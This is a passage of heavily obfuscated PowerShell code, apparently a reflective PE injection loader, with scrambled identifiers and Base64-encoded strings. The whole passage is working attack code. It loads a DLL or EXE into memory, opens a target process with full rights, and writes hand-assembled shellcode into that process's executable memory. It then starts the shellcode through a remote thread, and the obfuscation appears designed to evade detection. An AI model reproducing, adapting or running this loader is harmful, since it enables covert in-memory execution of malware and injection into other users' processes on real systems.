			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, ${__/=\____/\_/\/\_/}, ${_/=====\_/=\/\___/}.SizeOfHeaders) | Out-Null
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${_/=====\_/=\/\___/} = ____/=\_/\/====\_/ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/} -Win32Types $Win32Types -Win32Constants $Win32Constants
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${/=\/\_/\/==\/\/\/}
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${/=\__/\/==\/\_/==}
		Write-Verbose "StartAddress: $(_/==\___/==\/\___/ ${__/=\____/\_/\/\_/})    EndAddress: $(_/==\___/==\/\___/ ${/=\/\_/\/==\/\/\/})"
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		___/\__/=\/\/\/=\/ -PEBytes $PEBytes -_/=====\_/=\/\___/ ${_/=====\_/=\/\___/} -Win32Functions $Win32Functions -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		___/\__/=\/\/\___/ -_/=====\_/=\/\___/ ${_/=====\_/=\/\___/} -___/==\__/\/=\/\_/ ${___/==\__/\/=\/\_/} -Win32Constants $Win32Constants -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${___/=\/=\/\_/\_/=} -eq $true)
		{
			_/=\_/\/==\___/\_/ -_/=====\_/=\/\___/ ${_/=====\_/=\/\___/} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -__/\_/\__/\/\__/\/ ${__/\_/\__/\/\__/\/}
		}
		else
		{
			_/=\_/\/==\___/\_/ -_/=====\_/=\/\___/ ${_/=====\_/=\/\___/} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		if (${___/=\/=\/\_/\_/=} -eq $false)
		{
			if (${/===\___/=\/==\/=} -eq $true)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				__/=\_/\/\_/\/=\/\ -_/=====\_/=\/\___/ ${_/=====\_/=\/\___/} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${___/=\/=\/\_/\_/=} -eq $true)
		{
			[UInt32]${_/=\/==\_/\______} = 0
			${_/\_/\__/\/=\/\/\} = $Win32Functions.WriteProcessMemory.Invoke(${__/\_/\__/\/\__/\/}, ${/=\__/\/==\/\_/==}, ${__/=\____/\_/\/\_/}, [UIntPtr](${_/=====\_/=\/\___/}.SizeOfImage), [Ref]${_/=\/==\_/\______})
			if (${_/\_/\__/\/=\/\/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${_/=====\_/=\/\___/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${___/=\/=\/\_/\_/=} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${___/=\_____/\/==\} = ____/\____/====\/= (${_/=====\_/=\/\___/}.PEHandle) (${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${_/======\/====\/\} = _/====\/==\______/ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${____/===\__/===\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=\_____/\/==\}, ${_/======\/====\/\})
				${____/===\__/===\_}.Invoke(${_/=====\_/=\/\___/}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${___/=\_____/\/==\} = ____/\____/====\/= (${/=\__/\/==\/\_/==}) (${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${_/=====\_/=\/\___/}.PE64Bit -eq $true)
				{
					${_/\/==\/\/=\/\/=\} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${_/\_/=\/\_/\/====} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${/=\_/\_/\/=\___/=} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${_/\/==\/\/=\/\/=\} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${_/\_/=\/\_/\/====} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${/=\_/\_/\/=\___/=} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${/=\/\/=\/===\____} = ${_/\/==\/\/=\/\/=\}.Length + ${_/\_/=\/\_/\/====}.Length + ${/=\_/\_/\/=\___/=}.Length + (${/=\/==\___/=\/\_/} * 2)
				${_/==\/\/\/\/==\__} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\/\/=\/===\____})
				${_/\__/\_/=\___/\/} = ${_/==\/\/\/\/==\__}
				__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${_/\/==\/\/=\/\/=\} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
				${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${_/\/==\/\/=\/\/=\}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\__/\/==\/\_/==}, ${_/==\/\/\/\/==\__}, $false)
				${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/==\___/=\/\_/})
				__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${_/\_/=\/\_/\/====} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
				${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${_/\_/=\/\_/\/====}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/=\_____/\/==\}, ${_/==\/\/\/\/==\__}, $false)
				${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/==\___/=\/\_/})
				__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${/=\_/\_/\/=\___/=} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
				${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\_/\_/\/=\___/=}.Length)
				${__/\/\/=\__/=\/==} = $Win32Functions.VirtualAllocEx.Invoke(${__/\_/\__/\/\__/\/}, [IntPtr]::Zero, [UIntPtr][UInt64]${/=\/\/=\/===\____}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if (${__/\/\/=\__/=\/==} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${_/\_/\__/\/=\/\/\} = $Win32Functions.WriteProcessMemory.Invoke(${__/\_/\__/\/\__/\/}, ${__/\/\/=\__/=\/==}, ${_/\__/\_/=\___/\/}, [UIntPtr][UInt64]${/=\/\/=\/===\____}, [Ref]${_/=\/==\_/\______})
				if ((${_/\_/\__/\/=\/\/\} -eq $false) -or ([UInt64]${_/=\/==\_/\______} -ne [UInt64]${/=\/\/=\/===\____}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${_/\/=\_/==\_/\___} = _/===\_/\_/\/==\_/ -___/=\/=\/====\___ ${__/\_/\__/\/\__/\/} -_/==\__/=\_/=\/\_/ ${__/\/\/=\__/=\/==} -Win32Functions $Win32Functions
				${_/==\/=\__/\___/\} = $Win32Functions.WaitForSingleObject.Invoke(${_/\/=\_/==\_/\___}, 20000)
				if (${_/==\/=\__/\___/\} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
				}
				$Win32Functions.VirtualFreeEx.Invoke(${__/\_/\__/\/\__/\/}, ${__/\/\/=\__/=\/==}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${_/=====\_/=\/\___/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${__/=\____/=\/==\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${__/=\____/=\/==\/=}, 0, 0x00)
			${/===\/=\/=\/\/\_/} = ____/\/=\/\_/\/=\/ -_/=====\_/=\/\___/ ${_/=====\_/=\/\___/} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -__/\/==\_/=\/===\_ $ExeArgs -__/=\____/=\/==\/= ${__/=\____/=\/==\/=}
			[IntPtr]${/==\_____/=======} = ____/\____/====\/= (${_/=====\_/=\/\___/}.PEHandle) (${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(_/==\___/==\/\___/ ${/==\_____/=======}). Creating thread for the EXE to run in."
			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${/==\_____/=======}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]${__/=\____________} = [System.Runtime.InteropServices.Marshal]::ReadByte(${__/=\____/=\/==\/=}, 0)
				if (${__/=\____________} -eq 1)
				{
					___/\_/\/\___/=\_/ -___/\/=========\__ ${/===\/=\/=\/\/\_/} -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${_/=====\_/=\/\___/}.PEHandle, ${/=\__/\/==\/\_/==})
	}
	Function _____/==\/==\/\_/\
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/=\____/\_/\/\_/}
		)
		$Win32Constants = __/\/==\____/=\/=\
		$Win32Functions = __/\/\__/\/=\__/\_
		$Win32Types = _/=\_/=\_/\/\__/=\
		${_/=====\_/=\/\___/} = ____/=\_/\/====\_/ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${___/\__/=\/\_/\/\} = ____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.PEHandle) ([Int64]${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${___/\_/\_/==\_/\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/\__/=\/\_/\/\}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${___/\_/\_/==\_/\_}.Characteristics -eq 0 `
						-and ${___/\_/\_/==\_/\_}.FirstThunk -eq 0 `
						-and ${___/\_/\_/==\_/\_}.ForwarderChain -eq 0 `
						-and ${___/\_/\_/==\_/\_}.Name -eq 0 `
						-and ${___/\_/\_/==\_/\_}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${_/===\_/==\/=====} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.PEHandle) ([Int64]${___/\_/\_/==\_/\_}.Name)))
				${__/\/\/=====\/===} = $Win32Functions.GetModuleHandle.Invoke(${_/===\_/==\/=====})
				if (${__/\/\/=====\/===} -eq $null)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwBlAHQAdABpAG4AZwAgAEQATABMACAAaABhAG4AZABsAGUAIABpAG4AIABNAGUAbQBvAHIAeQBGAHIAZQBlAEwAaQBiAHIAYQByAHkALAAgAEQATABMAE4AYQBtAGUAOgAgACQAewBfAC8APQA9AD0AXABfAC8APQA9AFwALwA9AD0APQA9AD0AfQAuACAAQwBvAG4AdABpAG4AdQBpAG4AZwAgAGEAbgB5AHcAYQB5AHMA'))) -WarningAction Continue
				}
				${_/\_/\__/\/=\/\/\} = $Win32Functions.FreeLibrary.Invoke(${__/\/\/=====\/===})
				if (${_/\_/\__/\/=\/\/\} -eq $false)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAHIAZQBlACAAbABpAGIAcgBhAHIAeQA6ACAAJAB7AF8ALwA9AD0APQBcAF8ALwA9AD0AXAAvAD0APQA9AD0APQB9AC4AIABDAG8AbgB0AGkAbgB1AGkAbgBnACAAYQBuAHkAdwBhAHkAcwAuAA=='))) -WarningAction Continue
				}
				${___/\__/=\/\_/\/\} = ____/\____/====\/= (${___/\__/=\/\_/\/\}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${___/=\_____/\/==\} = ____/\____/====\/= (${_/=====\_/=\/\___/}.PEHandle) (${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${_/======\/====\/\} = _/====\/==\______/ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${____/===\__/===\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=\_____/\/==\}, ${_/======\/====\/\})
		${____/===\__/===\_}.Invoke(${_/=====\_/=\/\___/}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${_/\_/\__/\/=\/\/\} = $Win32Functions.VirtualFree.Invoke(${__/=\____/\_/\/\_/}, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if (${_/\_/\__/\/=\/\/\} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function ___/======\/=\/===
	{
		$Win32Functions = __/\/\__/\/=\__/\_
		$Win32Types = _/=\_/=\_/\/\__/=\
		$Win32Constants =  __/\/==\____/=\/=\
		${__/\_/\__/\/\__/\/} = [IntPtr]::Zero
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			${/=\_/==\/\_/\/===} = @(ps -Name $ProcName -ErrorAction SilentlyContinue)
			if (${/=\_/==\/\_/\/===}.Count -eq 0)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAZgBpAG4AZAAgAHAAcgBvAGMAZQBzAHMAIAAkAFAAcgBvAGMATgBhAG0AZQA=')))
			}
			elseif (${/=\_/==\/\_/\/===}.Count -gt 1)
			{
				${_/===\/\/==\/\/==} = ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId
				echo ${_/===\/\/==\/\/==}
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAHQAaABhAG4AIABvAG4AZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgACQAUAByAG8AYwBOAGEAbQBlACAAZgBvAHUAbgBkACwAIABwAGwAZQBhAHMAZQAgAHMAcABlAGMAaQBmAHkAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABJAEQAIAB0AG8AIABpAG4AagBlAGMAdAAgAGkAbgAgAHQAbwAuAA==')))
			}
			else
			{
				$ProcId = ${/=\_/==\/\_/\/===}[0].ID
			}
		}
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			${__/\_/\__/\/\__/\/} = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if (${__/\_/\__/\/\__/\/} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbwBiAHQAYQBpAG4AIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIABwAHIAbwBjAGUAcwBzACAASQBEADoAIAAkAFAAcgBvAGMASQBkAA==')))
			}
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
		${__/=\____/\_/\/\_/} = [IntPtr]::Zero
		if (${__/\_/\__/\/\__/\/} -eq [IntPtr]::Zero)
		{
			${_/\__/==\/\/=\_/=} = ___/=\_/\__/=\___/ -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			${_/\__/==\/\/=\_/=} = ___/=\_/\__/=\___/ -PEBytes $PEBytes -ExeArgs $ExeArgs -__/\_/\__/\/\__/\/ ${__/\_/\__/\/\__/\/} -ForceASLR $ForceASLR
		}
		if (${_/\__/==\/\/=\_/=} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${__/=\____/\_/\/\_/} = ${_/\__/==\/\/=\_/=}[0]
		${_/\_/=====\/\/\/\} = ${_/\__/==\/\/=\_/=}[1] 
		${_/=====\_/=\/\___/} = ____/=\_/\/====\_/ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if ((${_/=====\_/=\/\___/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/\_/\__/\/\__/\/} -eq [IntPtr]::Zero))
		{
	        switch ($FuncReturnType)
	        {
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${__/=\____/\___/==} = ___/\__/=\___/=\__ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/} -_/\_________/\_/\/ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwBGAHUAbgBjAA==')))
				    if (${__/=\____/\___/==} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${_/\__/\/=\/=\_/==} = _/====\/==\______/ @() ([IntPtr])
				    ${/=\/==\/=\_/====\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\____/\___/==}, ${_/\__/\/=\/=\_/==})
				    [IntPtr]${/===\__/\/====\/=} = ${/=\/==\/=\_/====\}.Invoke()
				    ${__/=\/\/=\_____/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/===\__/\/====\/=})
				    echo ${__/=\/\/=\_____/=}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA'))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABTAHQAcgBpAG4AZwAgAHIAZQB0AHUAcgBuACAAdAB5AHAAZQA=')))
				    [IntPtr]${_____/====\_/\_/=} = ___/\__/=\___/=\__ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/} -_/\_________/\_/\/ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcARgB1AG4AYwA=')))
				    if (${_____/====\_/\_/=} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${/\_____/\_____/==} = _/====\/==\______/ @() ([IntPtr])
				    ${_/==\/\__/\/=\___} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_____/====\_/\_/=}, ${/\_____/\_____/==})
				    [IntPtr]${/===\__/\/====\/=} = ${_/==\/\__/\/=\___}.Invoke()
				    ${__/=\/\/=\_____/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${/===\__/\/====\/=})
				    echo ${__/=\/\/=\_____/=}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABWAG8AaQBkACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${_/==\/\/\/=\__/=\} = ___/\__/=\___/=\__ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/} -_/\_________/\_/\/ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
				    if (${_/==\/\/\/=\__/=\} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${/==\_____/\/=\__/} = _/====\/==\______/ @() ([Void])
				    ${_/==\/==\_/\/===\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\/\/\/=\__/=\}, ${/==\_____/\/=\__/})
				    ${_/==\/==\_/\/===\}.Invoke() | Out-Null
	            }
	        }
		}
